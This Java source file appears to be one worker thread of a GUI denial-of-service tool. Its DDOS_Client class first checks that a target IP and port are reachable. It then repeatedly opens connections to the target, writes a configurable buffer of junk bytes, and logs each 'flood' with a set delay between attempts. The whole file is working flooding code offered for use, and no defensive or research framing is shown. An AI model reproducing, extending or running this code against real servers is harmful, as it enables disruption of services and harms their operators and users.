package ddos;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.io.PrintWriter;
import java.net.InetSocketAddress;
import java.net.Socket;
import java.util.Arrays;
import java.util.Random;
import ddos.Logger.MSG;
import gui.MainFrame.DELAY_MODE;
import launch.Main;
import useful.Useful;

public class DDOS_Client extends Thread {
	
	private final String ip;
	private final String port;
	
	public final int thread_number;
	
	public boolean keepAlive = true;
	
	private final boolean checker;
	
	private final int junkSize;
	private final int timeoutDelay;
	
	private final boolean randomJunk;
	private final int initialDelay;
	
	private final DDOS_Client_Thread pointer_ddosct;
	
	public DDOS_Client(String ip, String port, int tr_num, boolean check, int junkSize, DDOS_Client_Thread pointer, int timeoutDelay, boolean randomJunk, DELAY_MODE delayMode, int customDelayAmt) {
		this.ip = ip;
		this.port = port;
		this.thread_number = tr_num;
		this.checker = check;
		this.junkSize = junkSize;
		this.pointer_ddosct = pointer;
		this.timeoutDelay = timeoutDelay;
		this.randomJunk = randomJunk;
		
		this.initialDelay = (delayMode != DELAY_MODE.CUSTOM_DELAY ? delayMode.delay : customDelayAmt);
		
		System.out.println(initialDelay);
	}
	
	
	
	public void run() {
		Logger.get.log_str("Added DDOS_THREAD " + thread_number);
		if(checker) {
			try(Socket cl = new Socket())
			{
				Logger.get.log_str(thread_number + " is Trying to connect, timeout " + timeoutDelay + " milis...");
				cl.connect(new InetSocketAddress(ip, Integer.parseInt(port)), timeoutDelay);
				BufferedReader in = new BufferedReader(new InputStreamReader(cl.getInputStream()));
				PrintWriter request = new PrintWriter(cl.getOutputStream());
				
				request.print("GET / HTTP/1.1\r\n\r\n"); 
				request.flush();
				System.out.println(in.readLine());
				Useful.easySleep(10);
				Logger.get.log_str(thread_number + " - \""+ip+"\"" + " is available!", MSG.SUCCESS);
				
				keepAlive = false;
			}
			catch (Exception ex)
			{
				Logger.get.log_str(thread_number + " - \""+ip+"\"" + " is not available!", MSG.ERROR);
				
				keepAlive = false;
			}
			Main.enable_btns();
		}
		else
		{
			//int flood_count = 0;
			Socket cl;
			
			InetSocketAddress adrr = new InetSocketAddress(ip, Integer.parseInt(port));
			
			PrintWriter request;
			try
			{
				cl = new Socket();
				Logger.get.log_str(thread_number + " is Trying to connect, timeout " + timeoutDelay + " milis...");
				cl.connect(adrr, timeoutDelay);
				BufferedReader in = new BufferedReader(new InputStreamReader(cl.getInputStream()));
				request = new PrintWriter(cl.getOutputStream());
				request.print("GET / HTTP/1.1\r\n\r\n"); 
				request.flush();
				
				Logger.get.log_str("", MSG.BLANK);
				Logger.get.log_str("Connection succeeded! First response: " + in.readLine(), MSG.SUCCESS);
				
				in.close();
				in = null;
			}
			catch (Exception ex)
			{
				Logger.get.log_str(thread_number + " - \""+ip+"\"" + " is not available!", MSG.ERROR);
				
				keepAlive = false;
				Main.enable_btns();
				Main.disable_stop_btn();
				return;
			}
			
			byte[] junk = new byte[junkSize];
			if(randomJunk)
				new Random().nextBytes(junk);
			else
				Arrays.fill(junk, (byte)(0x7F+1));
			
			while(keepAlive && DDOS.allThreadsKeepAlive)
			{
				cl = new Socket();
				try {
					cl.connect(adrr, timeoutDelay);
					OutputStream out = cl.getOutputStream();
					out.write(junk);
					out.flush();
					cl.close();
				} catch (IOException e) {
					e.printStackTrace();
				}
				
				Logger.get.log_str("Attack: flood " + pointer_ddosct.flood_count++ + " - " + thread_number, MSG.SUCCESS);
				
				Useful.easySleep(initialDelay);
			}
		}
		Useful.easySleep(50);
		Logger.get.log_str("DDOS_THREAD " + thread_number + " is dead", MSG.WARNING);
		Main.disable_stop_btn();
	}
}	
